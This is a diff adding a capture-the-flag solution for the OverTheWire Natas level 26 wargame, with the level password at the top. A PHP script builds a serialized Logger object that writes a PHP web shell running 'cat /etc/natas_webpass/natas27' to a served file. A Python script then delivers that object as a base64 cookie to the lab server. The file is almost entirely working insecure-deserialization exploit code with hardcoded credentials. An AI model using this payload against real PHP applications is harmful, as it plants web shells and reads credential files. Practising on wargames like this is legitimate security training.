@@ -1,0 +1,34 @@
+natas26:8A506rfIAXbKKk68yJeuTuRq4UfcK70k
+
+<?php
+class Logger
+{
+	private $logFile;
+	private $initMsg;
+	private $exitMsg;
+
+	function __construct($file)
+	{
+		$this->initMsg= "Hi\n";
+		$this->exitMsg= "<? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
+		$this->logFile = "img/nt27.php";
+	}
+}
+$object = new Logger("Some text");
+print base64_encode(serialize($object))."\n";
+?>
+
+
+import requests
+
+url = 'http://natas26.natas.labs.overthewire.org/'
+s = requests.Session()
+s.auth = ('natas26', '8A506rfIAXbKKk68yJeuTuRq4UfcK70k')
+params = {'x1': 1, 'y1': 1, 'x2': 10, 'y2': 10}
+cookies = {
+	'PHPSESSID': s.get(url).cookies['PHPSESSID'],
+	'drawing': 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL250MjcucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoiSGkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/IHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KCiI7fQ=='
+}
+
+r = s.get(url, cookies=cookies, params=params)
+print(r.text)
